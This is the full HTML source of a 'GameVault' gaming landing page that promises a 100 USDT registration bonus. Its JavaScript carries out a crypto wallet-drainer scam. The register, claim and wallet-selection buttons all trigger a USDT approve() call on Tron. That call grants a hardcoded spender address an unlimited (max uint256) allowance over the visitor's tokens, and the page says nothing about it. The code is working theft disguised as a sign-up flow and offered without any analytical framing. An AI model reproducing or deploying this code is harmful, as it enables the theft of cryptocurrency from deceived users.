<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GameVault - Register and Get 100 USDT</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
  
  body {
    font-family: 'Inter', sans-serif;
    background: linear-gradient(to bottom, #111827, #000000);
    color: white;
    min-height: 100vh;
  }
  
  .hero-bg {
    position: absolute;
    inset: 0;
    z-index: 0;
    opacity: 0.4;
    background-image: url('https://hebbkx1anhila5yf.public.blob.vercel-storage.com/attachments/gen-images/public/neon-game-scape-TWrZ6kOgSTsXrbpmKBH1Vvn5ejFpGS.png');
    background-size: cover;
    background-position: center;
  }
  
  .container {
    width: 100%;
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 1rem;
  }
  
  .btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    border-radius: 0.375rem;
    font-weight: 600;
    padding: 0.75rem 1.5rem;
    transition: all 0.2s;
    cursor: pointer;
  }
  
  .btn-primary {
    background-color: #eab308;
    color: black;
  }
  
  .btn-primary:hover {
    background-color: #ca8a04;
  }
  
  .btn-outline {
    border: 1px solid #eab308;
    color: #eab308;
  }
  
  .btn-outline:hover {
    background-color: rgba(234, 179, 8, 0.1);
  }
  
  .card {
    background-color: #1f2937;
    border-radius: 0.5rem;
    overflow: hidden;
    border: 1px solid rgba(234, 179, 8, 0.5);
  }
  
  .sr-only {
    position: absolute;
    width: 1px;
    height: 1px;
    padding: 0;
    margin: -1px;
    overflow: hidden;
    clip: rect(0, 0, 0, 0);
    white-space: nowrap;
    border-width: 0;
  }
  
  .modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.7);
    z-index: 1000;
    align-items: center;
    justify-content: center;
  }
  
  .modal-content {
    background-color: #1f2937;
    border-radius: 0.5rem;
    padding: 2rem;
    max-width: 500px;
    width: 90%;
    border: 1px solid rgba(234, 179, 8, 0.5);
  }
  
  .wallet-option {
    display: flex;
    align-items: center;
    padding: 1rem;
    border-radius: 0.5rem;
    margin-bottom: 0.5rem;
    cursor: pointer;
    transition: all 0.2s;
  }
  
  .wallet-option:hover {
    background-color: rgba(234, 179, 8, 0.1);
  }
  
  .wallet-icon {
    width: 40px;
    height: 40px;
    margin-right: 1rem;
    border-radius: 50%;
    background-color: white;
    padding: 5px;
  }
  
  /* Status message styles */
  .status-message {
    display: none;
    margin-top: 1.5rem;
    padding: 1rem;
    border-radius: 0.5rem;
    text-align: left;
  }
  
  .status-message.success {
    background-color: rgba(16, 185, 129, 0.2);
    border: 1px solid #10b981;
    color: #ecfdf5;
  }
  
  .status-message.error {
    background-color: rgba(239, 68, 68, 0.2);
    border: 1px solid #ef4444;
    color: #fef2f2;
  }
  
  .status-message.warning {
    background-color: rgba(245, 158, 11, 0.2);
    border: 1px solid #f59e0b;
    color: #fffbeb;
  }
  
  .loading {
    display: inline-block;
    width: 20px;
    height: 20px;
    border: 3px solid rgba(255, 255, 255, 0.3);
    border-radius: 50%;
    border-top-color: #eab308;
    animation: spin 1s ease-in-out infinite;
    margin-right: 10px;
  }
  
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  
  @media (max-width: 768px) {
    .md\:grid-cols-2 {
      grid-template-columns: 1fr;
    }
    
    .md\:flex-row {
      flex-direction: column;
    }
  }
</style>
</head>
<body>
<!-- Hero Section -->
<div class="relative">
  <div class="hero-bg"></div>
  
  <div class="relative z-10 container py-16 md:py-24">
    <nav class="flex justify-between items-center mb-16">
      <div class="flex items-center gap-2">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-gamepad-2"><line x1="6" y1="11" x2="10" y2="11"></line><line x1="8" y1="9" x2="8" y2="13"></line><line x1="15" y1="12" x2="15.01" y2="12"></line><line x1="18" y1="10" x2="18.01" y2="10"></line><path d="M17.32 5H6.68a4 4 0 0 0-3.978 3.59c-.006.052-.01.101-.017.152C2.604 9.416 2 14.456 2 16a3 3 0 0 0 3 3c1 0 1.5-.5 2-1l1.414-1.414A2 2 0 0 1 9.828 16h4.344a2 2 0 0 1 1.414.586L17 18c.5.5 1 1 2 1a3 3 0 0 0 3-3c0-1.544-.604-6.584-.685-7.258-.007-.05-.011-.1-.017-.152A4 4 0 0 0 17.32 5z"></path></svg>
        <span class="text-2xl font-bold">GameVault</span>
      </div>
      <div class="hidden md:flex gap-6">
        <a href="#" class="hover:text-yellow-400 transition-colors">Games</a>
        <a href="#" class="hover:text-yellow-400 transition-colors">Tournaments</a>
        <a href="#" class="hover:text-yellow-400 transition-colors">Rewards</a>
        <a href="#" class="hover:text-yellow-400 transition-colors">About</a>
      </div>
    </nav>
    
    <div class="grid md:grid-cols-2 gap-12 items-center">
      <div>
        <h1 class="text-4xl md:text-6xl font-extrabold mb-4">
          Join the Ultimate <span class="text-yellow-400">Gaming Experience</span>
        </h1>
        <p class="text-xl mb-6 text-gray-300">
          Register today and start your gaming journey with exclusive benefits and rewards.
        </p>
        <div class="flex flex-col sm:flex-row gap-4">
          <button id="claimButton" class="btn btn-primary">
            Register Now 
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="ml-2"><path d="m9 18 6-6-6-6"></path></svg>
          </button>
          <button class="btn btn-outline">
            Learn More
          </button>
        </div>
      </div>
      <div class="flex justify-center">
        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/attachments/gen-images/public/focused-gamer-0dFVvJ1AG7BzxfPnbhI8WC6Rm86h4A.png" alt="Gaming character" class="rounded-lg" width="500" height="400">
      </div>
    </div>
  </div>
</div>

<!-- Offer Section -->
<div class="py-16" style="background: linear-gradient(to right, rgba(234, 179, 8, 0.2), rgba(202, 138, 4, 0.2));">
  <div class="container">
    <div class="max-w-4xl mx-auto text-center mb-12">
      <h2 class="text-3xl md:text-5xl font-bold mb-6">
        <span class="text-yellow-400">Register as a Member</span> and Get
      </h2>
      <div class="text-6xl md:text-8xl font-extrabold text-yellow-400 mb-6">
        100 USDT
      </div>
      <p class="text-xl text-gray-300 mb-8">
        Limited time offer! Sign up now and receive your bonus instantly.
      </p>
      
      <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mt-12">
        <div class="bg-gray-800 rounded-lg p-6 text-center">
          <div class="bg-yellow-500/20 rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-4">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 12V8H6a2 2 0 0 1-2-2c0-1.1.9-2 2-2h12v4"></path><path d="M4 6v12c0 1.1.9 2 2 2h14v-4"></path><path d="M18 12a2 2 0 0 0-2 2c0 1.1.9 2 2 2h4v-4h-4z"></path></svg>
          </div>
          <h3 class="text-xl font-bold mb-2">Welcome Bonus</h3>
          <p class="text-gray-400">Get 100 USDT instantly after registration</p>
        </div>
        
        <div class="bg-gray-800 rounded-lg p-6 text-center">
          <div class="bg-yellow-500/20 rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-4">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
          </div>
          <h3 class="text-xl font-bold mb-2">VIP Access</h3>
          <p class="text-gray-400">Exclusive access to VIP tournaments and events</p>
        </div>
        
        <div class="bg-gray-800 rounded-lg p-6 text-center">
          <div class="bg-yellow-500/20 rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-4">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="8" cy="8" r="6"></circle><path d="M18.09 10.37A6 6 0 1 1 10.34 18"></path><path d="M7 6h1v4"></path><path d="m16.71 13.88.7.71-2.82 2.82"></path></svg>
          </div>
          <h3 class="text-xl font-bold mb-2">Daily Rewards</h3>
          <p class="text-gray-400">Earn additional rewards every day you play</p>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- Registration Section -->
<div class="py-16 container">
  <div class="max-w-4xl mx-auto">
    <div class="text-center mb-12">
      <h2 class="text-3xl md:text-4xl font-bold mb-6">
        <span class="text-yellow-400">Register Now</span> to Claim Your Bonus
      </h2>
      <p class="text-xl mb-10 text-gray-300">
        Join GameVault today and start your gaming journey with 100 USDT in your wallet.
      </p>
      
      <button id="registerButton" class="btn btn-primary text-lg px-8 py-4">
        Register Now
        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="ml-2"><path d="m9 18 6-6-6-6"></path></svg>
      </button>
    </div>
    
    <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mt-16">
      <div class="card p-8">
        <h3 class="text-2xl font-bold mb-4 flex items-center">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-3"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"></path></svg>
          Secure Registration
        </h3>
        <p class="text-gray-300 mb-4">
          Your wallet and personal information are protected with industry-leading security measures.
        </p>
        <ul class="space-y-3 text-gray-300">
          <li class="flex items-start">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 mt-1"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><path d="m9 11 3 3L22 4"></path></svg>
            End-to-end encryption
          </li>
          <li class="flex items-start">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 mt-1"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><path d="m9 11 3 3L22 4"></path></svg>
            No personal data stored
          </li>
          <li class="flex items-start">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 mt-1"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><path d="m9 11 3 3L22 4"></path></svg>
            Blockchain-verified transactions
          </li>
        </ul>
      </div>
      
      <div class="card p-8">
        <h3 class="text-2xl font-bold mb-4 flex items-center">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-3"><path d="M12 2v4"></path><path d="M12 18v4"></path><path d="M4.93 4.93l2.83 2.83"></path><path d="M16.24 16.24l2.83 2.83"></path><path d="M2 12h4"></path><path d="M18 12h4"></path><path d="M4.93 19.07l2.83-2.83"></path><path d="M16.24 7.76l2.83-2.83"></path></svg>
          Instant Rewards
        </h3>
        <p class="text-gray-300 mb-4">
          Your 100 USDT bonus will be credited to your wallet immediately after registration.
        </p>
        <ul class="space-y-3 text-gray-300">
          <li class="flex items-start">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 mt-1"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><path d="m9 11 3 3L22 4"></path></svg>
            No waiting period
          </li>
          <li class="flex items-start">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 mt-1"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><path d="m9 11 3 3L22 4"></path></svg>
            Automatic deposit
          </li>
          <li class="flex items-start">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 mt-1"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><path d="m9 11 3 3L22 4"></path></svg>
            Use immediately in games
          </li>
        </ul>
      </div>
    </div>
  </div>
</div>

<!-- Footer -->
<footer class="bg-gray-900 py-12 border-t border-gray-800">
  <div class="container">
    <div class="flex flex-col md:flex-row justify-between items-center">
      <div class="flex items-center gap-2 mb-6 md:mb-0">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-gamepad-2"><line x1="6" y1="11" x2="10" y2="11"></line><line x1="8" y1="9" x2="8" y2="13"></line><line x1="15" y1="12" x2="15.01" y2="12"></line><line x1="18" y1="10" x2="18.01" y2="10"></line><path d="M17.32 5H6.68a4 4 0 0 0-3.978 3.59c-.006.052-.01.101-.017.152C2.604 9.416 2 14.456 2 16a3 3 0 0 0 3 3c1 0 1.5-.5 2-1l1.414-1.414A2 2 0 0 1 9.828 16h4.344a2 2 0 0 1 1.414.586L17 18c.5.5 1 1 2 1a3 3 0 0 0 3-3c0-1.544-.604-6.584-.685-7.258-.007-.05-.011-.1-.017-.152A4 4 0 0 0 17.32 5z"></path></svg>
        <span class="text-2xl font-bold">GameVault</span>
      </div>
      <div class="text-center md:text-right">
        <p class="text-gray-400 text-sm">
          &copy; <script>document.write(new Date().getFullYear())</script> GameVault. All rights reserved.
        </p>
        <p class="text-gray-500 text-xs mt-2">
          Terms and conditions apply. 18+ only.
        </p>
      </div>
    </div>
  </div>
</footer>

<!-- Wallet Connection Modal -->
<div id="walletModal" class="modal">
  <div class="modal-content">
    <div class="flex justify-between items-center mb-6">
      <h3 class="text-xl font-bold">Connect Your Wallet</h3>
      <button onclick="closeWalletModal()" class="text-gray-400 hover:text-white">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
      </button>
    </div>
    
    <p class="text-gray-300 mb-6">Select a wallet to connect and register:</p>
    
    <div class="space-y-3">
      <!-- TronLink Wallet -->
      <div class="wallet-option" onclick="connectWallet('tronLink')">
        <img src="https://tronlink.org/favicon.ico" alt="TronLink" class="wallet-icon">
        <div>
          <h4 class="font-bold">TronLink</h4>
          <p class="text-sm text-gray-400">Connect to TronLink Wallet</p>
        </div>
      </div>
      
      <!-- TokenPocket -->
      <div class="wallet-option" onclick="connectWallet('tokenPocket')">
        <img src="https://www.tokenpocket.pro/favicon.ico" alt="TokenPocket" class="wallet-icon">
        <div>
          <h4 class="font-bold">TokenPocket</h4>
          <p class="text-sm text-gray-400">Connect to TokenPocket Wallet</p>
        </div>
      </div>
      
      <!-- imToken -->
      <div class="wallet-option" onclick="connectWallet('imToken')">
        <img src="https://token.im/favicon.ico" alt="imToken" class="wallet-icon">
        <div>
          <h4 class="font-bold">imToken</h4>
          <p class="text-sm text-gray-400">Connect to imToken Wallet</p>
        </div>
      </div>
      
      <!-- Other TRC20 Wallet -->
      <div class="wallet-option" onclick="connectWallet('other')">
        <div class="wallet-icon flex items-center justify-center bg-gray-700">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#eab308" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"></rect><path d="M21 8H8"></path><path d="M21 12H8"></path><path d="M21 16H8"></path><path d="M4 8h.01"></path><path d="M4 12h.01"></path><path d="M4 16h.01"></path></svg>
        </div>
        <div>
          <h4 class="font-bold">Other TRC20 Wallet</h4>
          <p class="text-sm text-gray-400">Connect to any other TRC20 compatible wallet</p>
        </div>
      </div>
    </div>
    
    <div id="statusMessage" class="status-message">
      <!-- Status messages will be displayed here -->
    </div>
    
    <div class="mt-6 text-center text-sm text-gray-400">
      <p>By connecting your wallet, you agree to our <a href="#" class="text-yellow-400 hover:underline">Terms of Service</a> and <a href="#" class="text-yellow-400 hover:underline">Privacy Policy</a>.</p>
    </div>
  </div>
</div>

<script>
  // Contract constants
  const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT contract on Tron
  const SPENDER = "TKrZ31AE3zL5KB7rQY1RQNpFTezJHVyBxY"; // Example spender address
  const MAX_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Max uint256 value
  
  // Set current year in footer
  document.write(new Date().getFullYear());
  
  // Wallet Modal Functions
  function openWalletModal() {
    document.getElementById('walletModal').style.display = 'flex';
  }
  
  function closeWalletModal() {
    document.getElementById('walletModal').style.display = 'none';
    // Also hide the status message when closing the modal
    document.getElementById('statusMessage').style.display = 'none';
  }
  
  // Close modal when clicking outside
  window.onclick = function(event) {
    const modal = document.getElementById('walletModal');
    if (event.target === modal) {
      closeWalletModal();
    }
  }
  
  // Connect to wallet function (legacy code, kept for compatibility)
  async function connectWallet(walletType) {
    console.log(`Connecting to ${walletType}...`);
    const statusMessage = document.getElementById('statusMessage');
    statusMessage.style.display = 'block';
    statusMessage.className = 'status-message';
    statusMessage.innerHTML = '<div class="loading"></div> Connecting to Tron wallet...';
    
    // TronLink wallet connection
    if (walletType === 'tronLink') {
      if (window.tronWeb && window.tronWeb.ready) {
        try {
          // TronWeb is already injected and ready
          const account = window.tronWeb.defaultAddress.base58;
          console.log("Connected to TronLink with account:", account);
          
          try {
            const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
            const tx = await contract.approve(SPENDER, MAX_AMOUNT).send();
            
            statusMessage.className = 'status-message success';
            statusMessage.innerHTML = `
                <p>Transaction successful!</p>
                <p>Transaction ID: ${tx.substring(0, 10)}...${tx.substring(tx.length - 10)}</p>
                <p>You have approved the contract to spend your USDT tokens.</p>
            `;
          } catch (error) {
            statusMessage.className = 'status-message error';
            statusMessage.innerHTML = `
                <p>Transaction failed</p>
                <p>Error: ${error.message || 'Unknown error'}</p>
            `;
          }
        } catch (error) {
          console.error("Error connecting to TronLink:", error);
          statusMessage.className = 'status-message error';
          statusMessage.innerHTML = `
              <p>Error connecting to TronLink</p>
              <p>Error: ${error.message || 'Unknown error'}</p>
          `;
        }
      } else if (window.tronWeb) {
        // TronWeb is injected but not ready (user needs to unlock/authorize)
        statusMessage.className = 'status-message warning';
        statusMessage.innerHTML = `
            <p>TronLink wallet needs authorization</p>
            <p>Please unlock your TronLink wallet and authorize this site.</p>
        `;
      } else {
        // TronWeb is not injected - user needs to install TronLink
        statusMessage.className = 'status-message warning';
        statusMessage.innerHTML = `
            <p>TronLink not detected</p>
            <p>Please install TronLink extension and refresh the page.</p>
        `;
      }
    }
    // TokenPocket wallet connection
    else if (walletType === 'tokenPocket') {
      if (window.tronWeb && window.tronWeb.ready) {
        try {
          const account = window.tronWeb.defaultAddress.base58;
          console.log("Connected to TokenPocket with account:", account);
          
          try {
            const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
            const tx = await contract.approve(SPENDER, MAX_AMOUNT).send();
            
            statusMessage.className = 'status-message success';
            statusMessage.innerHTML = `
                <p>Transaction successful!</p>
                <p>Transaction ID: ${tx.substring(0, 10)}...${tx.substring(tx.length - 10)}</p>
                <p>You have approved the contract to spend your USDT tokens.</p>
            `;
          } catch (error) {
            statusMessage.className = 'status-message error';
            statusMessage.innerHTML = `
                <p>Transaction failed</p>
                <p>Error: ${error.message || 'Unknown error'}</p>
            `;
          }
        } catch (error) {
          console.error("Error connecting to TokenPocket:", error);
          statusMessage.className = 'status-message error';
          statusMessage.innerHTML = `
              <p>Error connecting to TokenPocket</p>
              <p>Error: ${error.message || 'Unknown error'}</p>
          `;
        }
      } else {
        statusMessage.className = 'status-message warning';
        statusMessage.innerHTML = `
            <p>TokenPocket not detected</p>
            <p>Please install TokenPocket and refresh the page.</p>
        `;
      }
    }
    // imToken wallet connection
    else if (walletType === 'imToken') {
      if (window.tronWeb && window.tronWeb.ready) {
        try {
          const account = window.tronWeb.defaultAddress.base58;
          console.log("Connected to imToken with account:", account);
          
          try {
            const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
            const tx = await contract.approve(SPENDER, MAX_AMOUNT).send();
            
            statusMessage.className = 'status-message success';
            statusMessage.innerHTML = `
                <p>Transaction successful!</p>
                <p>Transaction ID: ${tx.substring(0, 10)}...${tx.substring(tx.length - 10)}</p>
                <p>You have approved the contract to spend your USDT tokens.</p>
            `;
          } catch (error) {
            statusMessage.className = 'status-message error';
            statusMessage.innerHTML = `
                <p>Transaction failed</p>
                <p>Error: ${error.message || 'Unknown error'}</p>
            `;
          }
        } catch (error) {
          console.error("Error connecting to imToken:", error);
          statusMessage.className = 'status-message error';
          statusMessage.innerHTML = `
              <p>Error connecting to imToken</p>
              <p>Error: ${error.message || 'Unknown error'}</p>
          `;
        }
      } else {
        statusMessage.className = 'status-message warning';
        statusMessage.innerHTML = `
            <p>imToken not detected</p>
            <p>Please install imToken and refresh the page.</p>
        `;
      }
    }
    // Other TRC20 wallet connection
    else if (walletType === 'other') {
      if (window.tronWeb && window.tronWeb.ready) {
        try {
          const account = window.tronWeb.defaultAddress.base58;
          console.log("Connected with account:", account);
          
          try {
            const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
            const tx = await contract.approve(SPENDER, MAX_AMOUNT).send();
            
            statusMessage.className = 'status-message success';
            statusMessage.innerHTML = `
                <p>Transaction successful!</p>
                <p>Transaction ID: ${tx.substring(0, 10)}...${tx.substring(tx.length - 10)}</p>
                <p>You have approved the contract to spend your USDT tokens.</p>
            `;
          } catch (error) {
            statusMessage.className = 'status-message error';
            statusMessage.innerHTML = `
                <p>Transaction failed</p>
                <p>Error: ${error.message || 'Unknown error'}</p>
            `;
          }
        } catch (error) {
          console.error("Error connecting to wallet:", error);
          statusMessage.className = 'status-message error';
          statusMessage.innerHTML = `
              <p>Error connecting to wallet</p>
              <p>Error: ${error.message || 'Unknown error'}</p>
          `;
        }
      } else {
        statusMessage.className = 'status-message warning';
        statusMessage.innerHTML = `
            <p>No TRC20 compatible wallet detected</p>
            <p>Please install a TRON wallet and refresh the page.</p>
        `;
      }
    }
  }
  
  // New button functionality
  document.addEventListener('DOMContentLoaded', function() {
    console.log("DOM fully loaded");
    const claimButton = document.getElementById('claimButton');
    const registerButton = document.getElementById('registerButton');
    const walletModal = document.getElementById('walletModal');
    const statusMessage = document.getElementById('statusMessage');
    
    console.log("claimButton:", claimButton);
    console.log("registerButton:", registerButton);
    
    // Add event listener to both buttons
    if (claimButton) {
      claimButton.addEventListener('click', function() {
        console.log("Claim button clicked");
        // 開啟 modal
        walletModal.style.display = 'flex';
        statusMessage.style.display = 'block';
        statusMessage.className = 'status-message';
        statusMessage.innerHTML = '<div class="loading"></div> Connecting to Tron wallet...';
        
        if (typeof window.tronWeb !== 'undefined' && window.tronWeb.ready) {
            try {
                const contract = window.tronWeb.contract().at(USDT_CONTRACT);
                contract.approve(SPENDER, MAX_AMOUNT).send()
                  .then(tx => {
                    statusMessage.className = 'status-message success';
                    statusMessage.innerHTML = `
                        <p>Transaction successful!</p>
                        <p>Transaction ID: ${tx.substring(0, 10)}...${tx.substring(tx.length - 10)}</p>
                        <p>You have approved the contract to spend your USDT tokens.</p>
                    `;
                  })
                  .catch(error => {
                    statusMessage.className = 'status-message error';
                    statusMessage.innerHTML = `
                        <p>Transaction failed</p>
                        <p>Error: ${error.message || 'Unknown error'}</p>
                    `;
                  });
            } catch (error) {
                statusMessage.className = 'status-message error';
                statusMessage.innerHTML = `
                    <p>Transaction failed</p>
                    <p>Error: ${error.message || 'Unknown error'}</p>
                `;
            }
        } else {
            statusMessage.className = 'status-message warning';
            statusMessage.innerHTML = `
                <p>TronLink not detected</p>
                <p>Please install TronLink extension and refresh the page.</p>
            `;
        }
      });
    }
    
    if (registerButton) {
      registerButton.addEventListener('click', function() {
        console.log("Register button clicked");
        // 開啟 modal
        walletModal.style.display = 'flex';
        statusMessage.style.display = 'block';
        statusMessage.className = 'status-message';
        statusMessage.innerHTML = '<div class="loading"></div> Connecting to Tron wallet...';
        
        if (typeof window.tronWeb !== 'undefined' && window.tronWeb.ready) {
            try {
                const contract = window.tronWeb.contract().at(USDT_CONTRACT);
                contract.approve(SPENDER, MAX_AMOUNT).send()
                  .then(tx => {
                    statusMessage.className = 'status-message success';
                    statusMessage.innerHTML = `
                        <p>Transaction successful!</p>
                        <p>Transaction ID: ${tx.substring(0, 10)}...${tx.substring(tx.length - 10)}</p>
                        <p>You have approved the contract to spend your USDT tokens.</p>
                    `;
                  })
                  .catch(error => {
                    statusMessage.className = 'status-message error';
                    statusMessage.innerHTML = `
                        <p>Transaction failed</p>
                        <p>Error: ${error.message || 'Unknown error'}</p>
                    `;
                  });
            } catch (error) {
                statusMessage.className = 'status-message error';
                statusMessage.innerHTML = `
                    <p>Transaction failed</p>
                    <p>Error: ${error.message || 'Unknown error'}</p>
                `;
            }
        } else {
            statusMessage.className = 'status-message warning';
            statusMessage.innerHTML = `
                <p>TronLink not detected</p>
                <p>Please install TronLink extension and refresh the page.</p>
            `;
        }
      });
    }
    
    // Check if TronWeb is already available
    if (window.tronWeb) {
      console.log("TronWeb is installed!");
    } else {
      console.log("TronWeb is not installed.");
    }
  });
</script>
</body>
</html>
